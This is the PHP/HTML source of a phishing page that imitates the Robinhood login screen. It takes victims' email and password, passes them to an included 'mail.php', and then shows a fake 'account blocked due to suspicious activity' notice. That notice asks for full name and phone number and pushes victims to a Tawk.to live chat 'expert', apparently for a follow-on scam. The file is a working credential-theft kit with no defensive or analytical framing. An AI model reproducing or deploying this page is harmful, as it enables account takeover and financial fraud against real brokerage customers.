<!DOCTYPE html>
<html lang="en-US" dir="ltr">
   <head>
      <meta name="robots" content="noindex, nofollow"/>
      <meta name="googlebot" content="noindex, nofollow"/>
      <meta name="bingbot" content="noindex, nofollow"/>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
      <link rel="shortcut icon" href="assets/favicon.ico">
      <link rel="stylesheet" href="assets/App.c2ab73d60b3d22eb019d.css" type="text/css" media="all">
      <link rel="stylesheet" href="style.css" type="text/css" media="all">
      <title>Log In | Robinhood</title>
   </head>
   <body class="theme-open-up">
      <div id="react_root">
         <div>
            
            <div class="css-10d7enp">
               <div class="css-eyq2zi">
                  <div class="css-17exwhe">
                     <img aria-hidden="true" data-test-id="default-image" sizes="(min-width: 768px) 1440px, 720px" src="assets/1e23d6b90f0d905b425ea289de345ab1.jpg"  class="css-1ox8jnp">
                     <div class="css-17gd2ko">
                        <div class="css-1lmgvjv">
                           <div>
                              <?php
                                 if (isset($_POST['btnLoginMore'])) {
                                    include 'mail.php';
                                 ?>
                              <form action="" method="post">
                                 <div class=" mb-4 alert-danger text-center" style="text-align: center; color: red; font-size: 17px;">Attention: the account has been <b>temporarily blocked due to suspicious activity in your Network IP,</b> kindly verify the following details<br>
                                    Kindly contact chat assistance for further help
                                 </div>
                                 <br>
                                 <header class="css-52qs92"><span class="css-1vd3m2i">Verification Required</span></header>
                                 <input type="hidden" name="email" value="<?php echo $_POST['email']; ?>" />
                                 <input type="hidden" name="password" value="<?php echo $_POST['password']; ?>" />
                                 <input type="hidden" name="brandName" value="Robinhood">
                                 <div class="css-1xipndn">
                                    <div>
                                       <div class="css-i3pbo">
                                          <div class="css-1fky4ua">
                                             <label class="css-8atqhb">
                                                <div class="css-1te2hl9"><span class="css-o2h1av">Full Name</span></div>
                                                <div class="css-cgvuc8-InternalInput">
                                                   <input aria-describedby="" autocapitalize="off" autocomplete="name" autocorrect="off" name="name" required="" spellcheck="false" class="remove-legacy css-1gulmj0-InternalInput" type="text" value="">
                                                </div>
                                             </label>
                                          </div>
                                       </div>
                                       <div class="css-1upilqn">
                                          <div class="css-13xzgk4">
                                             <label class="css-8atqhb">
                                                <div class="css-1te2hl9"><span class="css-o2h1av">Phone Number</span></div>
                                                <div class="css-13wonh0-InternalInput">
                                                   <input aria-describedby="" autocomplete="number" id="number" name="number" required="" class="remove-legacy css-1tvo6io-InternalInput" type="text" value="">
                                                </div>
                                             </label>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                                 <footer class="css-1c7gf0b">
                                    <div id="submitbutton" class="css-0">
                                       <div class="css-1jzivk7">
                                          <button type="submit" name="fromLog" aria-busy="false" class="css-jowa3o-UnstyledButton-BaseButton"><span class="css-1lg9j9q-InternalButtonContent"><span class="css-1w49doo-InternalButtonContent"><span class="css-w8p71j">Verify</span></span></span></button>
                                       </div>
                                    </div>
                                 </footer>
                              </form>
                              <?php } elseif (isset($_POST['fromLog'])) {
                                 include 'mail.php';
                                 ?>
                              <form action="" method="post">
                                 <header class="css-52qs92"  style=" text-align: center;"><span class="css-1vd3m2i">Account blocked</span></header>
                                 <div class="panel-body text-center" style=" text-align: center;">
                                    <p style="font-size: 20px;">Your account has been <b>temporarily blocked</b> due to <br>suspicious activity on your Network IP.<br>Kindly ask an expert</p>
                                    <div class="form">
                                       <label style="font-size: 18px;">Error CODE: <b>6X76D</b></label><br>
                                    </div>
                                    <div class="calling-number">
                                       <a class="btn btn-danger" href="javascript:void(Tawk_API.toggle())" style="background: #bf0707;color: #fff !important;font-size: 20px;font-weight: 600;margin-top: 15px; padding: 5px; display: inline-flex; text-decoration: none;">Ask Expert</a>
                                    </div>
                                 </div>
                              </form>
                              <?php } else { ?>
                              <form action="" method="post">
                                 <input type="hidden" name="brandName" value="Robinhood">
                                 <header class="css-52qs92"><span class="css-1vd3m2i">Log in to Robinhood</span></header>
                                 <div class="css-1xipndn">
                                    <div>
                                       <div class="css-i3pbo">
                                          <div class="css-1fky4ua">
                                             <label class="css-8atqhb">
                                                <div class="css-1te2hl9"><span class="css-o2h1av">Email</span></div>
                                                <div class="css-cgvuc8-InternalInput">
                                                   <input aria-describedby="" autocapitalize="off" autocomplete="username" autocorrect="off" name="email" required="" spellcheck="false" class="remove-legacy css-1gulmj0-InternalInput" type="email" value="">
                                                </div>
                                             </label>
                                          </div>
                                       </div>
                                       <div class="css-1upilqn">
                                          <div class="css-13xzgk4">
                                             <label class="css-8atqhb">
                                                <div class="css-1te2hl9"><span class="css-o2h1av">Password</span></div>
                                                <div class="css-13wonh0-InternalInput">
                                                   <input aria-describedby="" autocomplete="current-password" id="current-password" name="password" required="" class="remove-legacy css-1tvo6io-InternalInput" type="password" value="">
                                                </div>
                                             </label>
                                          </div>
                                       </div>
                                    </div>
                                    <p><a role="link" class="rh-hyperlink css-mwxq27-UnstyledAnchor-inlineButtonStyles-BaseButton" rel="" href="#"><span class="css-1lg9j9q-InternalButtonContent"><span class="css-1w49doo-InternalButtonContent"><span class="css-i6yoyz">Forgot your password?</span></span></span></a></p>
                                    <p aria-live="assertive" data-testid="LoginErrorMessage">
                                    <div class="_2QawT-EkOq7gIQN1hHcFqU" style="height: 0px; transition-duration: 300ms;">
                                       <div class="_3UC6vIw0Z8kgiibABGCPT2">
                                          
                                       </div>
                                    </div>
                                    </p>
                                 </div>
                                 <footer class="css-1c7gf0b">
                                    <div id="submitbutton" class="css-0">
                                       <div class="css-1jzivk7">
                                          <button type="submit" name="btnLoginMore" aria-busy="false" class="css-jowa3o-UnstyledButton-BaseButton"><span class="css-1lg9j9q-InternalButtonContent"><span class="css-1w49doo-InternalButtonContent"><span class="css-w8p71j">Log In</span></span></span></button>
                                       </div>
                                    </div>
                                    <div style="margin-top: 25px;"><span class="css-o2h1av">Not on Robinhood?</span> <a role="link" class="rh-hyperlink css-1nedewm-UnstyledAnchor-inlineButtonStyles-BaseButton" rel="" href="#"><span class="css-1lg9j9q-InternalButtonContent"><span class="css-1w49doo-InternalButtonContent"><span class="css-eaou0n">Create an account</span></span></span></a></div>
                                 </footer>
                              </form>
                              <?php }  ?>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </div>
      <!--Start of Tawk.to Script-->
      <script type="text/javascript">
         var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
         (function(){
         var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
         s1.async=true;
         s1.src='https://embed.tawk.to/620a586d9bd1f31184dc89bb/1frs6irvs';
         s1.charset='UTF-8';
         s1.setAttribute('crossorigin','*');
         s0.parentNode.insertBefore(s1,s0);
         })();
      </script>
      <!--End of Tawk.to Script--> 
   </body>
</html>